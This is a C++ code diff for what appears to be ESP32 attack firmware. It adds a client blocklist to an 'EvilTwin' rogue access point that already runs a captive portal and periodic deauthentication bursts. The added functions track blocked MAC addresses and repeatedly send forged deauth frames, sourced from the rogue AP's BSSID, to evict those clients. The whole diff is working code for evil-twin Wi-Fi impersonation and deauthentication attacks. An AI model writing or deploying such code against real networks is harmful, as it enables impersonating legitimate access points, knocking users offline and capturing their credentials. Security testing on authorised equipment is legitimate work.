@@ -189,7 +189,11 @@ void EvilTwin::stop() {
 #endif
     
     state_ = EvilTwinState::STOPPING;
-    
+
+    // The blocklist is session-scoped: drop it so the next attack starts with a clean set
+    // (ADR-0132). Pure state, cleared on both host and device.
+    blockedCount_ = 0;
+
 #ifndef UNIT_TEST
     // Stop captive portal (DNS + HTTP)
     arduinoPortal_.stop();
@@ -232,7 +236,13 @@ void EvilTwin::update() {
         adversary::EventBus::getInstance().publish(event);
     }
     lastClientCount = stats_.clientsConnected;
-    
+
+    // Keep blocklisted clients off our AP: deauth any that are still associated (ADR-0132).
+    // Poll-based, so eviction lands on this cycle rather than the instant of reconnection.
+    if (blockedCount_ > 0) {
+        enforceBlocklist();
+    }
+
     // Update stats from portal
     stats_.dnsQueries = arduinoPortal_.getDnsQueryCount();
     stats_.httpRequests = arduinoPortal_.getRequestCount();
@@ -260,6 +270,82 @@ void EvilTwin::sendDeauthBurst() {
     LOG_D("EVILTWIN", "Sent periodic deauth burst");
 #else
     stats_.deauthsSent += 6;
+#endif
+}
+
+int EvilTwin::findBlocked(const uint8_t* mac) const {
+    if (!mac) return -1;
+    for (uint8_t i = 0; i < blockedCount_; i++) {
+        if (memcmp(blocklist_[i], mac, 6) == 0) return i;
+    }
+    return -1;
+}
+
+bool EvilTwin::isClientBlocked(const uint8_t* mac) const {
+    return findBlocked(mac) >= 0;
+}
+
+bool EvilTwin::blockClient(const uint8_t* mac) {
+    if (!mac) return false;
+    if (findBlocked(mac) >= 0) return false;                  // already blocked
+    if (blockedCount_ >= EVIL_TWIN_MAX_CLIENTS) return false;  // blocklist full
+    memcpy(blocklist_[blockedCount_++], mac, 6);
+    return true;
+}
+
+bool EvilTwin::unblockClient(const uint8_t* mac) {
+    int idx = findBlocked(mac);
+    if (idx < 0) return false;  // not blocked
+    // Compact by moving the last entry into the hole; order does not matter for a set.
+    blockedCount_--;
+    if (static_cast<uint8_t>(idx) != blockedCount_) {
+        memcpy(blocklist_[idx], blocklist_[blockedCount_], 6);
+    }
+    return true;
+}
+
+void EvilTwin::deauthClientOnce(const uint8_t* clientMac) {
+    if (!clientMac) return;
+    uint8_t one[1][6];
+    memcpy(one[0], clientMac, 6);
+    sendApDeauth(one, 1);
+}
+
+void EvilTwin::enforceBlocklist() {
+#ifndef UNIT_TEST
+    ap::APClient clients[EVIL_TWIN_MAX_CLIENTS];
+    uint8_t n = getClients(clients, EVIL_TWIN_MAX_CLIENTS);
+
+    uint8_t targets[EVIL_TWIN_MAX_CLIENTS][6];
+    uint8_t count = 0;
+    for (uint8_t i = 0; i < n; i++) {
+        if (findBlocked(clients[i].mac) >= 0) {
+            memcpy(targets[count++], clients[i].mac, 6);
+        }
+    }
+    if (count > 0) {
+        sendApDeauth(targets, count);
+    }
+#endif
+}
+
+void EvilTwin::sendApDeauth(const uint8_t targets[][6], uint8_t count) {
+#ifndef UNIT_TEST
+    if (count == 0) return;
+
+    // The deauth frame's source must be our rogue AP's BSSID so the client honours it. Read the
+    // live AP MAC rather than targetBSSID_: the latter is only set when the BSSID was cloned, and
+    // esp_wifi_set_mac(WIFI_IF_AP, ...) at start() made it the live value in that case anyway.
+    uint8_t apBssid[6];
+    if (esp_wifi_get_mac(WIFI_IF_AP, apBssid) != ESP_OK) {
+        LOG_W("EVILTWIN", "Cannot read AP BSSID; skipping client deauth");  // fail loud, no fake BSSID
+        return;
+    }
+    uint16_t sent = adversary::DeauthAttack::sendTargetedBurst(apBssid, targets, count, 3, true);
+    stats_.deauthsSent += sent;
+#else
+    (void)targets;
+    (void)count;
 #endif
 }
 
